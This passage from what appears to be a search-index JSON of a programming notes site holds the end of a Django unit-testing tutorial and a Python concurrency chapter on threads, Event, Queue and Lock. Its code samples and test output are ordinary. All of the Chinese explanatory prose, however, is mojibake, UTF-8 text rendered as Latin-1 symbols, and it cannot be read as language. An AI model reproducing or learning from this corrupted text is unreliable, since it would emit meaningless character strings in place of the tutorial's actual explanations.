in the future. \"\"\" time = timezone.now() + datetime.timedelta(days=30) future_question = Question(pub_date=time) self.assertIs(future_question.was_published_recently(), False) è§£è¯»ï¼š åˆ›å»ºä¸€ä¸ª django.test.TestCase çš„å­ç±»ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œ æ­¤æ–¹æ³•åˆ›å»ºä¸€ä¸ª pub_date æ—¶æœªæ¥æŸå¤©çš„ Question å®ä¾‹ã€‚ ç„¶åæ£€æŸ¥å®ƒçš„ was_published_recently() æ–¹æ³•çš„è¿”å›å€¼â€”â€”å®ƒ åº”è¯¥ æ˜¯ Falseã€‚ è¿è¡Œæµ‹è¯• åœ¨ç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡è¾“å…¥ä»¥ä¸‹ä»£ç è¿è¡Œæµ‹è¯•: $ python manage.py test polls ä½ å°†ä¼šçœ‹åˆ°è¿è¡Œç»“æœ: Creating test database for alias 'default'... System check identified no issues (0 silenced). F ====================================================================== FAIL: test_was_published_recently_with_future_question (polls.tests.QuestionModelTests) ---------------------------------------------------------------------- Traceback (most recent call last): File \"/path/to/mysite/polls/tests.py\", line 16, in test_was_published_recently_with_future_question self.assertIs(future_question.was_published_recently(), False) AssertionError: True is not False ---------------------------------------------------------------------- Ran 1 test in 0.001s FAILED (failures=1) Destroying test database for alias 'default'... ä»¥ä¸‹æ˜¯è‡ªåŠ¨åŒ–æµ‹è¯•çš„è¿è¡Œè¿‡ç¨‹ï¼š python manage.py test polls å°†ä¼šå¯»æ‰¾ polls åº”ç”¨é‡Œçš„æµ‹è¯•ä»£ç  å®ƒæ‰¾åˆ°äº† django.test.TestCase çš„ä¸€ä¸ªå­ç±» å®ƒåˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ä¾›æµ‹è¯•ä½¿ç”¨ å®ƒåœ¨ç±»ä¸­å¯»æ‰¾æµ‹è¯•æ–¹æ³•â€”â€”ä»¥ test å¼€å¤´çš„æ–¹æ³•ã€‚ åœ¨ test_was_published_recently_with_future_question æ–¹æ³•ä¸­ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ª pub_date å€¼ä¸º 30 å¤©åçš„ Question å®ä¾‹ã€‚ æ¥ç€ä½¿ç”¨ assertls() æ–¹æ³•ï¼Œå‘ç° was_published_recently() è¿”å›äº† True ï¼Œè€Œæˆ‘ä»¬æœŸæœ›å®ƒè¿”å› False ã€‚ æµ‹è¯•ç³»ç»Ÿé€šçŸ¥æˆ‘ä»¬å“ªäº›æµ‹è¯•æ ·ä¾‹å¤±è´¥äº†ï¼Œå’Œé€ æˆæµ‹è¯•å¤±è´¥çš„ä»£ç æ‰€åœ¨çš„è¡Œå·ã€‚ å‚è€ƒ: è‡ªåŠ¨åŒ–æµ‹è¯•ç®€ä»‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-test.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-test.html"},{"title":"å¹¶å‘ç¼–ç¨‹","text":"å¯¹äºå¹¶å‘ç¼–ç¨‹, Python æœ‰å¤šç§é•¿æœŸæ”¯æŒçš„æ–¹æ³•, åŒ…æ‹¬å¤šçº¿ç¨‹, è°ƒç”¨å­è¿›ç¨‹, ä»¥åŠå„ç§ å„æ ·çš„å…³äºç”Ÿæˆå™¨å‡½æ•°çš„æŠ€å·§. è¿™ä¸€ç« å°†ä¼šç»™å‡ºå¹¶å‘ç¼–ç¨‹å„ç§æ–¹é¢çš„æŠ€å·§, åŒ…æ‹¬é€šç”¨çš„ å¤šçº¿ç¨‹æŠ€æœ¯ä»¥åŠå¹¶è¡Œè®¡ç®—çš„å®ç°æ–¹æ³• å¯åŠ¨ä¸åœæ­¢çº¿ç¨‹ é—®é¢˜ ä½ è¦ä¸ºéœ€è¦å¹¶å‘æ‰§è¡Œçš„ä»£ç åˆ›å»º/é”€æ¯çº¿ç¨‹ è§£å†³æ–¹æ¡ˆ threading åº“å¯ä»¥åœ¨å•ç‹¬çš„çº¿ç¨‹ä¸­æ‰§è¡Œä»»ä½•çš„åœ¨ Python ä¸­å¯ä»¥è°ƒç”¨çš„å¯¹è±¡ã€‚ä½ å¯ ä»¥åˆ›å»ºä¸€ä¸ª Thread å¯¹è±¡å¹¶å°†ä½ è¦æ‰§è¡Œçš„å¯¹è±¡ä»¥ target å‚æ•°çš„å½¢å¼æä¾›ç»™è¯¥å¯¹è±¡ã€‚ ä¾‹å­: def countdown(n): ... from threading import Thread t = Thread(target=countdown, args=(10,)) t.start() å½“ä½ åˆ›å»ºå¥½ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡åï¼Œè¯¥å¯¹è±¡å¹¶ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œé™¤éä½ è°ƒç”¨å®ƒçš„ start() æ–¹æ³•ï¼ˆå½“ä½ è°ƒç”¨ start() æ–¹æ³•æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ä½ ä¼ é€’è¿›æ¥çš„å‡½æ•°ï¼Œå¹¶æŠŠä½ ä¼ é€’è¿›æ¥çš„å‚ æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ï¼‰ã€‚Python ä¸­çš„çº¿ç¨‹ä¼šåœ¨ä¸€ä¸ªå•ç‹¬çš„ç³»ç»Ÿçº§çº¿ç¨‹ä¸­æ‰§è¡Œï¼ˆæ¯”å¦‚è¯´ä¸€ä¸ª POSIX çº¿ç¨‹æˆ–è€…ä¸€ä¸ª Windows çº¿ç¨‹ï¼‰ï¼Œè¿™äº›çº¿ç¨‹å°†ç”±æ“ä½œç³»ç»Ÿæ¥å…¨æƒç®¡ç†ã€‚çº¿ç¨‹ä¸€æ—¦ å¯åŠ¨ï¼Œå°†ç‹¬ç«‹æ‰§è¡Œç›´åˆ°ç›®æ ‡å‡½æ•°è¿”å›ã€‚ ä¹Ÿå¯ä»¥å°†ä¸€ä¸ªçº¿ç¨‹åŠ å…¥åˆ°å½“å‰çº¿ç¨‹ï¼Œå¹¶ç­‰å¾…å®ƒç»ˆæ­¢: t.join() Python è§£é‡Šå™¨ç›´åˆ°æ‰€æœ‰çº¿ç¨‹éƒ½ç»ˆæ­¢å‰ä»ä¿æŒè¿è¡Œã€‚å¯¹äºéœ€è¦é•¿æ—¶é—´è¿è¡Œçš„çº¿ç¨‹æˆ– è€…éœ€è¦ä¸€ç›´è¿è¡Œçš„åå°ä»»åŠ¡ï¼Œä½ åº”å½“è€ƒè™‘ä½¿ç”¨åå°çº¿ç¨‹: t = Thread(target=countdown, args=(10,), daemon=True) t.start() åå°çº¿ç¨‹æ— æ³•ç­‰å¾…ï¼Œä¸è¿‡ï¼Œè¿™äº›çº¿ç¨‹ä¼šåœ¨ä¸»çº¿ç¨‹ç»ˆæ­¢æ—¶è‡ªåŠ¨é”€æ¯ã€‚é™¤äº†å¦‚ä¸Šæ‰€ç¤ºçš„ ä¸¤ä¸ªæ“ä½œï¼Œå¹¶æ²¡æœ‰å¤ªå¤šå¯ä»¥å¯¹çº¿ç¨‹åšçš„äº‹æƒ…ã€‚ä½ æ— æ³•ç»“æŸä¸€ä¸ªçº¿ç¨‹ï¼Œæ— æ³•ç»™å®ƒå‘é€ä¿¡ å·ï¼Œæ— æ³•è°ƒæ•´å®ƒçš„è°ƒåº¦ï¼Œä¹Ÿæ— æ³•æ‰§è¡Œå…¶ä»–é«˜çº§æ“ä½œã€‚å¦‚æœéœ€è¦è¿™äº›ç‰¹æ€§ï¼Œä½ éœ€è¦è‡ªå·±æ·» åŠ ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœä½ éœ€è¦ç»ˆæ­¢çº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å¿…é¡»é€šè¿‡ç¼–ç¨‹åœ¨æŸä¸ªç‰¹å®šç‚¹è½®è¯¢æ¥é€€ å‡ºã€‚ä½ å¯ä»¥åƒä¸‹è¾¹è¿™æ ·æŠŠçº¿ç¨‹æ”¾å…¥ä¸€ä¸ªç±»ä¸­: class CountdownTask: def __init__(self): self._running = True def terminate(self): self._running = False def run(self, n): while self._running and n > 0: print('T-minus', n) n -= 1 time.sleep(5) c = CountdownTask() t = Thread(target=c.run, args=(10,)) t.start() c.terminate() # Signal termination t.join() # Wait for actual termination (if needed) å¦‚æœçº¿ç¨‹æ‰§è¡Œä¸€äº›åƒ I/O è¿™æ ·çš„é˜»å¡æ“ä½œï¼Œé‚£ä¹ˆé€šè¿‡è½®è¯¢æ¥ç»ˆæ­¢çº¿ç¨‹å°†ä½¿å¾—çº¿ç¨‹ ä¹‹é—´çš„åè°ƒå˜å¾—éå¸¸æ£˜æ‰‹ã€‚æ¯”å¦‚ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹ä¸€ç›´é˜»å¡åœ¨ä¸€ä¸ª I/O æ“ä½œä¸Šï¼Œå®ƒå°±æ°¸ è¿œæ— æ³•è¿”å›ï¼Œä¹Ÿå°±æ— æ³•æ£€æŸ¥è‡ªå·±æ˜¯å¦å·²ç»è¢«ç»“æŸäº†ã€‚è¦æ­£ç¡®å¤„ç†è¿™äº›é—®é¢˜ï¼Œä½ éœ€è¦åˆ©ç”¨ è¶…æ—¶å¾ªç¯æ¥å°å¿ƒæ“ä½œçº¿ç¨‹: def run(self, sock): # sock is a socket sock.settimeout(5) # Set timeout period while self._running: # Perform a blocking I/O operation w/ timeout try: data = sock.recv(8192) break except socket.timeout: continue return è®¨è®º ç”±äºå…¨å±€è§£é‡Šé”ï¼ˆGILï¼‰çš„åŸå› ï¼ŒPython çš„çº¿ç¨‹è¢«é™åˆ¶åˆ°åŒä¸€æ—¶åˆ»åªå…è®¸ä¸€ä¸ªçº¿ ç¨‹æ‰§è¡Œè¿™æ ·ä¸€ä¸ªæ‰§è¡Œæ¨¡å‹ã€‚æ‰€ä»¥ï¼ŒPython çš„çº¿ç¨‹æ›´é€‚ç”¨äºå¤„ç† I/O å’Œå…¶ä»–éœ€è¦å¹¶å‘æ‰§ è¡Œçš„é˜»å¡æ“ä½œï¼ˆæ¯”å¦‚ç­‰å¾… I/Oã€ç­‰å¾…ä»æ•°æ®åº“è·å–æ•°æ®ç­‰ç­‰ï¼‰ï¼Œè€Œä¸æ˜¯éœ€è¦å¤šå¤„ç†å™¨å¹¶ è¡Œçš„è®¡ç®—å¯†é›†å‹ä»»åŠ¡ã€‚ åˆ¤æ–­çº¿ç¨‹æ˜¯å¦å·²ç»å¯åŠ¨ é—®é¢˜ ä½ å·²ç»å¯åŠ¨äº†ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯ä½ æƒ³çŸ¥é“å®ƒæ˜¯ä¸æ˜¯çœŸçš„å·²ç»å¼€å§‹è¿è¡Œäº†ã€‚ è§£å†³æ–¹æ¡ˆ çº¿ç¨‹çš„ä¸€ä¸ªå…³é”®ç‰¹æ€§æ˜¯æ¯ä¸ªçº¿ç¨‹éƒ½æ˜¯ç‹¬ç«‹è¿è¡Œä¸”çŠ¶æ€ä¸å¯é¢„æµ‹ã€‚å¦‚æœç¨‹åºä¸­çš„å…¶ ä»–çº¿ç¨‹éœ€è¦é€šè¿‡åˆ¤æ–­æŸä¸ªçº¿ç¨‹çš„çŠ¶æ€æ¥ç¡®å®šè‡ªå·±ä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œè¿™æ—¶çº¿ç¨‹åŒæ­¥é—®é¢˜å°± ä¼šå˜å¾—éå¸¸æ£˜æ‰‹ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ threading åº“ä¸­çš„ Event å¯¹è±¡ã€‚ Event å¯¹è±¡åŒ…å«ä¸€ä¸ªå¯ç”±çº¿ç¨‹è®¾ç½®çš„ä¿¡å·æ ‡å¿—ï¼Œå®ƒå…è®¸çº¿ç¨‹ç­‰å¾…æŸäº›äº‹ä»¶çš„å‘ç”Ÿã€‚åœ¨åˆ å§‹æƒ…å†µä¸‹ï¼Œevent å¯¹è±¡ä¸­çš„ä¿¡å·æ ‡å¿—è¢«è®¾ç½®ä¸ºå‡ã€‚å¦‚æœæœ‰çº¿ç¨‹ç­‰å¾…ä¸€ä¸ª event å¯¹è±¡ï¼Œè€Œ è¿™ä¸ª event å¯¹è±¡çš„æ ‡å¿—ä¸ºå‡ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°†ä¼šè¢«ä¸€ç›´é˜»å¡ç›´è‡³è¯¥æ ‡å¿—ä¸ºçœŸã€‚ä¸€ä¸ªçº¿ç¨‹ å¦‚æœå°†ä¸€ä¸ª event å¯¹è±¡çš„ä¿¡å·æ ‡å¿—è®¾ç½®ä¸ºçœŸï¼Œå®ƒå°†å”¤é†’æ‰€æœ‰ç­‰å¾…è¿™ä¸ª event å¯¹è±¡çš„çº¿ ç¨‹ã€‚å¦‚æœä¸€ä¸ªçº¿ç¨‹ç­‰å¾…ä¸€ä¸ªå·²ç»è¢«è®¾ç½®ä¸ºçœŸçš„ event å¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒå°†å¿½ç•¥è¿™ä¸ªäº‹ä»¶ï¼Œç»§ ç»­æ‰§è¡Œã€‚ä¸‹è¾¹çš„ä»£ç å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Event æ¥åè°ƒçº¿ç¨‹çš„å¯åŠ¨: from threading import Thread, Event import time # Code to execute in an independent thread def countdown(n, started_evt): print('countdown starting') started_evt.set() while n > 0: print('T-minus', n) n -= 1 time.sleep(5) # Create the event object that will be used to signal startup started_evt = Event() # Launch the thread and pass the startup event print('Launching countdown') t = Thread(target=countdown, args=(10,started_evt)) t.start() # Wait for the thread to start started_evt.wait() print('countdown is running') å½“ä½ æ‰§è¡Œè¿™æ®µä»£ç ï¼Œ\"countdown is running\"æ€»æ˜¯æ˜¾ç¤ºåœ¨\"countdown starting\"ä¹‹ åæ˜¾ç¤ºã€‚è¿™æ˜¯ç”±äºä½¿ç”¨ event æ¥åè°ƒçº¿ç¨‹ï¼Œä½¿å¾—ä¸»çº¿ç¨‹è¦ç­‰åˆ° countdown() å‡½æ•°è¾“å‡º å¯åŠ¨ä¿¡æ¯åï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œ è®¨è®º event å¯¹è±¡æœ€å¥½å•æ¬¡ä½¿ç”¨ï¼Œå°±æ˜¯è¯´ï¼Œä½ åˆ›å»ºä¸€ä¸ª event å¯¹è±¡ï¼Œè®©æŸä¸ªçº¿ç¨‹ç­‰å¾…è¿™ä¸ª å¯¹è±¡ï¼Œä¸€æ—¦è¿™ä¸ªå¯¹è±¡è¢«è®¾ç½®ä¸ºçœŸï¼Œä½ å°±åº”è¯¥ä¸¢å¼ƒå®ƒã€‚å°½ç®¡å¯ä»¥é€šè¿‡ clear() æ–¹æ³•æ¥é‡ ç½® event å¯¹è±¡ï¼Œä½†æ˜¯å¾ˆéš¾ç¡®ä¿å®‰å…¨åœ°æ¸…ç† event å¯¹è±¡å¹¶å¯¹å®ƒé‡æ–°èµ‹å€¼ã€‚å¾ˆå¯èƒ½ä¼šå‘ç”Ÿé”™ è¿‡äº‹ä»¶ã€æ­»é”æˆ–è€…å…¶ä»–é—®é¢˜ï¼ˆç‰¹åˆ«æ˜¯ï¼Œä½ æ— æ³•ä¿è¯é‡ç½® event å¯¹è±¡çš„ä»£ç ä¼šåœ¨çº¿ç¨‹å†æ¬¡ ç­‰å¾…è¿™ä¸ª event å¯¹è±¡ä¹‹å‰æ‰§è¡Œï¼‰ã€‚å¦‚æœä¸€ä¸ªçº¿ç¨‹éœ€è¦ä¸åœåœ°é‡å¤ä½¿ç”¨ event å¯¹è±¡ï¼Œä½ æœ€ å¥½ä½¿ç”¨ Condition å¯¹è±¡æ¥ä»£æ›¿ã€‚ Conditionç›´æ¥ä½¿ç”¨withå³å¯, ä½¿ç”¨notifyå”¤é†’å…¶ä»–çº¿ç¨‹. event å¯¹è±¡çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯å½“å®ƒè¢«è®¾ç½®ä¸ºçœŸæ—¶ä¼šå”¤é†’æ‰€æœ‰ç­‰å¾…å®ƒçš„çº¿ç¨‹ã€‚å¦‚æœä½  åªæƒ³å”¤é†’å•ä¸ªçº¿ç¨‹ï¼Œæœ€å¥½æ˜¯ä½¿ç”¨ä¿¡å·é‡æˆ–è€… Condition å¯¹è±¡æ¥æ›¿ä»£ã€‚ ä¿¡å·é‡Semaphoreä½¿ç”¨acquireå’Œrelease ç¼–å†™æ¶‰åŠåˆ°å¤§é‡çš„çº¿ç¨‹é—´åŒæ­¥é—®é¢˜çš„ä»£ç ä¼šè®©ä½ ç—›ä¸æ¬²ç”Ÿã€‚æ¯”è¾ƒåˆé€‚çš„æ–¹å¼æ˜¯ä½¿ ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œçº¿ç¨‹é—´é€šä¿¡æˆ–è€…æ¯ä¸ªæŠŠçº¿ç¨‹å½“ä½œä¸€ä¸ª Actorï¼Œåˆ©ç”¨ Actor æ¨¡å‹æ¥æ§åˆ¶å¹¶ å‘ã€‚ çº¿ç¨‹é—´é€šä¿¡ é—®é¢˜ ä½ çš„ç¨‹åºä¸­æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä½ éœ€è¦åœ¨è¿™äº›çº¿ç¨‹ä¹‹é—´å®‰å…¨åœ°äº¤æ¢ä¿¡æ¯æˆ–æ•°æ® è§£å†³æ–¹æ¡ˆ ä»ä¸€ä¸ªçº¿ç¨‹å‘å¦ä¸€ä¸ªçº¿ç¨‹å‘é€æ•°æ®æœ€å®‰å…¨çš„æ–¹å¼å¯èƒ½å°±æ˜¯ä½¿ç”¨ queue åº“ä¸­çš„é˜Ÿåˆ— äº†ã€‚åˆ›å»ºä¸€ä¸ªè¢«å¤šä¸ªçº¿ç¨‹å…±äº«çš„ Queue å¯¹è±¡ï¼Œè¿™äº›çº¿ç¨‹é€šè¿‡ä½¿ç”¨ put() å’Œ get() æ“ä½œ æ¥å‘é˜Ÿåˆ—ä¸­æ·»åŠ æˆ–è€…åˆ é™¤å…ƒç´ ã€‚ Queue å¯¹è±¡å·²ç»åŒ…å«äº†å¿…è¦çš„é”ï¼Œæ‰€ä»¥ä½ å¯ä»¥é€šè¿‡å®ƒåœ¨å¤šä¸ªçº¿ç¨‹é—´å¤šå®‰å…¨åœ°å…±äº«æ•° æ®ã€‚å½“ä½¿ç”¨é˜Ÿåˆ—æ—¶ï¼Œåè°ƒç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„å…³é—­é—®é¢˜å¯èƒ½ä¼šæœ‰ä¸€äº›éº»çƒ¦ã€‚ä¸€ä¸ªé€šç”¨çš„è§£ å†³æ–¹æ³•æ˜¯åœ¨é˜Ÿåˆ—ä¸­æ”¾ç½®ä¸€ä¸ªç‰¹æ®Šçš„å€¼ï¼Œå½“æ¶ˆè´¹è€…è¯»åˆ°è¿™ä¸ªå€¼çš„æ—¶å€™ï¼Œç»ˆæ­¢æ‰§è¡Œã€‚ æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹ï¼šæ¶ˆè´¹è€…åœ¨è¯»åˆ°è¿™ä¸ªç‰¹æ®Šå€¼ä¹‹åç«‹å³åˆæŠŠå®ƒæ”¾å›åˆ°é˜Ÿåˆ— ä¸­ï¼Œå°†ä¹‹ä¼ é€’ä¸‹å»ã€‚è¿™æ ·ï¼Œæ‰€æœ‰ç›‘å¬è¿™ä¸ªé˜Ÿåˆ—çš„æ¶ˆè´¹è€…çº¿ç¨‹å°±å¯ä»¥å…¨éƒ¨å…³é—­äº†ã€‚å°½ç®¡é˜Ÿ åˆ—æ˜¯æœ€å¸¸è§çš„çº¿ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥è‡ªå·±é€šè¿‡åˆ›å»ºè‡ªå·±çš„æ•°æ®ç»“æ„å¹¶æ·»åŠ æ‰€ éœ€çš„é”å’ŒåŒæ­¥æœºåˆ¶æ¥å®ç°çº¿ç¨‹é—´é€šä¿¡ã€‚æœ€å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Condition å˜é‡æ¥åŒ…è£…ä½  çš„æ•°æ®ç»“æ„ã€‚ ä½¿ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œçº¿ç¨‹é—´é€šä¿¡æ˜¯ä¸€ä¸ªå•å‘ã€ä¸ç¡®å®šçš„è¿‡ç¨‹ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä½ æ²¡æœ‰åŠæ³• çŸ¥é“æ¥æ”¶æ•°æ®çš„çº¿ç¨‹æ˜¯ä»€ä¹ˆæ—¶å€™æ¥æ”¶åˆ°çš„æ•°æ®å¹¶å¼€å§‹å·¥ä½œçš„ã€‚ä¸è¿‡é˜Ÿåˆ—å¯¹è±¡æä¾›ä¸€äº› åŸºæœ¬å®Œæˆçš„ç‰¹æ€§ï¼Œæ¯”å¦‚ä¸‹è¾¹è¿™ä¸ªä¾‹å­ä¸­çš„ task_done() å’Œ join() # A thread that consumes data def consumer(in_q): while True: # Get some data data = in_q.get() # Process the data ... # Indicate completion in_q.task_done() q = Queue() t1 = Thread(target=consumer, args=(q,)) # Wait for all produced items to be consumed q.join() å¦‚æœä¸€ä¸ªçº¿ç¨‹éœ€è¦åœ¨ä¸€ä¸ª\"æ¶ˆè´¹è€…\"çº¿ç¨‹å¤„ç†å®Œç‰¹å®šçš„æ•°æ®é¡¹æ—¶ç«‹å³å¾—åˆ°é€šçŸ¥ï¼Œ ä½ å¯ä»¥æŠŠè¦å‘é€çš„æ•°æ®å’Œä¸€ä¸ª Event æ”¾åˆ°ä¸€èµ·ä½¿ç”¨ï¼Œè¿™æ ·\"ç”Ÿäº§è€…\"å°±å¯ä»¥é€šè¿‡è¿™ä¸ª Event å¯¹è±¡æ¥ç›‘æµ‹å¤„ç†çš„è¿‡ç¨‹äº†: # Make an (data, event) pair and hand it to the consumer evt = Event() out_q.put((data, evt)) ... # Wait for the consumer to process the item evt.wait() è®¨è®º åŸºäºç®€å•é˜Ÿåˆ—ç¼–å†™å¤šçº¿ç¨‹ç¨‹åºåœ¨å¤šæ•°æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ˜æ™ºçš„é€‰æ‹©ã€‚ä»çº¿ç¨‹å®‰å…¨ é˜Ÿåˆ—çš„åº•å±‚å®ç°æ¥çœ‹ï¼Œä½ æ— éœ€åœ¨ä½ çš„ä»£ç ä¸­ä½¿ç”¨é”å’Œå…¶ä»–åº•å±‚çš„åŒæ­¥æœºåˆ¶ï¼Œè¿™äº›åªä¼šæŠŠ ä½ çš„ç¨‹åºå¼„å¾—ä¹±ä¸ƒå…«ç³Ÿã€‚æ­¤å¤–ï¼Œä½¿ç”¨é˜Ÿåˆ—è¿™ç§åŸºäºæ¶ˆæ¯çš„é€šä¿¡æœºåˆ¶å¯ä»¥è¢«æ‰©å±•åˆ°æ›´å¤§çš„ åº”ç”¨èŒƒç•´ï¼Œæ¯”å¦‚ï¼Œä½ å¯ä»¥æŠŠä½ çš„ç¨‹åºæ”¾å…¥å¤šä¸ªè¿›ç¨‹ç”šè‡³æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿè€Œæ— éœ€æ”¹å˜åº•å±‚çš„ é˜Ÿåˆ—ç»“æ„ã€‚ä½¿ç”¨çº¿ç¨‹é˜Ÿåˆ—æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼Œå‘é˜Ÿåˆ—ä¸­æ·»åŠ æ•°æ®é¡¹æ—¶å¹¶ä¸ä¼šå¤åˆ¶æ­¤ æ•°æ®é¡¹ï¼Œçº¿ç¨‹é—´é€šä¿¡å®é™…ä¸Šæ˜¯åœ¨çº¿ç¨‹é—´ä¼ é€’å¯¹è±¡å¼•ç”¨ã€‚å¦‚æœä½ æ‹…å¿ƒå¯¹è±¡çš„å…±äº«çŠ¶æ€ï¼Œé‚£ ä½ æœ€å¥½åªä¼ é€’ä¸å¯ä¿®æ”¹çš„æ•°æ®ç»“æ„ï¼ˆå¦‚ï¼šæ•´å‹ã€å­—ç¬¦ä¸²æˆ–è€…å…ƒç»„ï¼‰æˆ–è€…ä¸€ä¸ªå¯¹è±¡çš„æ·±æ‹· è´ã€‚ Queue å¯¹è±¡æä¾›ä¸€äº›åœ¨å½“å‰ä¸Šä¸‹æ–‡å¾ˆæœ‰ç”¨çš„é™„åŠ ç‰¹æ€§ã€‚æ¯”å¦‚åœ¨åˆ›å»º Queue å¯¹è±¡æ—¶ æä¾›å¯é€‰çš„ size å‚æ•°æ¥é™åˆ¶å¯ä»¥æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­çš„å…ƒç´ æ•°é‡ã€‚å¯¹äº\"ç”Ÿäº§è€…\"ä¸\"æ¶ˆè´¹ è€…\"é€Ÿåº¦æœ‰å·®å¼‚çš„æƒ…å†µï¼Œä¸ºé˜Ÿåˆ—ä¸­çš„å…ƒç´ æ•°é‡æ·»åŠ ä¸Šé™æ˜¯æœ‰æ„ä¹‰çš„ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ª\"ç”Ÿäº§ è€…\"äº§ç”Ÿé¡¹ç›®çš„é€Ÿåº¦æ¯”\"æ¶ˆè´¹è€…\"\"æ¶ˆè´¹\"çš„é€Ÿåº¦å¿«ï¼Œé‚£ä¹ˆä½¿ç”¨å›ºå®šå¤§å°çš„é˜Ÿåˆ—å°±å¯ä»¥ åœ¨é˜Ÿåˆ—å·²æ»¡çš„æ—¶å€™é˜»å¡é˜Ÿåˆ—ï¼Œä»¥å…æœªé¢„æœŸçš„è¿é”æ•ˆåº”æ‰©æ•£æ•´ä¸ªç¨‹åºé€ æˆæ­»é”æˆ–è€…ç¨‹åº è¿è¡Œå¤±å¸¸ã€‚åœ¨é€šä¿¡çš„çº¿ç¨‹ä¹‹é—´è¿›è¡Œ\"æµé‡æ§åˆ¶\"æ˜¯ä¸€ä¸ªçœ‹èµ·æ¥å®¹æ˜“å®ç°èµ·æ¥å›°éš¾çš„é—® é¢˜ã€‚å¦‚æœä½ å‘ç°è‡ªå·±æ›¾ç»è¯•å›¾é€šè¿‡æ‘†å¼„é˜Ÿåˆ—å¤§å°æ¥è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¹Ÿè®¸å°±æ ‡å¿—ç€ä½ çš„ ç¨‹åºå¯èƒ½å­˜åœ¨è„†å¼±è®¾è®¡æˆ–è€…å›ºæœ‰çš„å¯ä¼¸ç¼©é—®é¢˜ã€‚get() å’Œ put() æ–¹æ³•éƒ½æ”¯æŒéé˜»å¡æ–¹ å¼å’Œè®¾å®šè¶…æ—¶ï¼Œ: import queue q = queue.Queue() data = q.get(block=False) data = q.get(timeout=5.0) getæ—¶ä¸ºç©ºæˆ–è€…è¶…æ—¶æ²¡è·å–åˆ°æ˜¯å°±æ˜¯queue.Emptyå¼‚å¸¸, putä½†æ˜¯æ»¡äº†å°±æ˜¯queue.Fullå¼‚å¸¸. æœ€åï¼Œæœ‰ q.qsize() ï¼Œq.full() ï¼Œq.empty() ç­‰å®ç”¨æ–¹æ³•å¯ä»¥è·å–ä¸€ä¸ªé˜Ÿåˆ—çš„å½“å‰ å¤§å°å’ŒçŠ¶æ€ã€‚ä½†è¦æ³¨æ„ï¼Œè¿™äº›æ–¹æ³•éƒ½ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å¯èƒ½ä½ å¯¹ä¸€ä¸ªé˜Ÿåˆ—ä½¿ç”¨ empty() åˆ¤æ–­å‡ºè¿™ä¸ªé˜Ÿåˆ—ä¸ºç©ºï¼Œä½†åŒæ—¶å¦å¤–ä¸€ä¸ªçº¿ç¨‹å¯èƒ½å·²ç»å‘è¿™ä¸ªé˜Ÿåˆ—ä¸­æ’å…¥ä¸€ä¸ªæ•°æ®é¡¹ã€‚æ‰€ ä»¥ï¼Œä½ æœ€å¥½ä¸è¦åœ¨ä½ çš„ä»£ç ä¸­ä½¿ç”¨è¿™äº›æ–¹æ³•ã€‚ ç»™å…³é”®éƒ¨åˆ†åŠ é” é—®é¢˜ ä½ éœ€è¦å¯¹å¤šçº¿ç¨‹ç¨‹åºä¸­çš„ä¸´ç•ŒåŒºåŠ é”ä»¥é¿å…ç«äº‰æ¡ä»¶ã€‚ è§£å†³æ–¹æ¡ˆ è¦åœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­å®‰å…¨ä½¿ç”¨å¯å˜å¯¹è±¡ï¼Œä½ éœ€è¦ä½¿ç”¨ threading åº“ä¸­çš„ Lock å¯¹è±¡ Lock å¯¹è±¡å’Œ with è¯­å¥å—ä¸€èµ·ä½¿ç”¨å¯ä»¥ä¿è¯äº’æ–¥æ‰§è¡Œï¼Œå°±æ˜¯æ¯æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ ä»¥æ‰§è¡Œ with è¯­å¥åŒ…å«çš„ä»£ç å—ã€‚with è¯­å¥ä¼šåœ¨è¿™ä¸ªä»£ç å—æ‰§è¡Œå‰è‡ªåŠ¨è·å–é”ï¼Œåœ¨æ‰§è¡Œ ç»“æŸåè‡ªåŠ¨é‡Šæ”¾é”ã€‚ è®¨è®º çº¿ç¨‹è°ƒåº¦æœ¬è´¨ä¸Šæ˜¯ä¸ç¡®å®šçš„ï¼Œå› æ­¤ï¼Œåœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­é”™è¯¯åœ°ä½¿ç”¨é”æœºåˆ¶å¯èƒ½ä¼šå¯¼è‡´ 